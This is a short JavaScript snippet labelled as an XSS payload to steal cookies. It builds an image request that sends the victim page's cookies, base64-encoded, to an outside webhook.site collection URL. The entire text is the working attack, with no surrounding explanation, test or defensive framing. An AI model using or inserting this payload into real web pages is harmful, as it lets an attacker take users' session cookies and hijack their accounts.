// XSS Payload to steal cookies
var img = new Image();
img.src = 'https://webhook.site/e53a789c-ebbb-4084-a690-9ac5e65d3677?data=' + btoa(document.cookie);
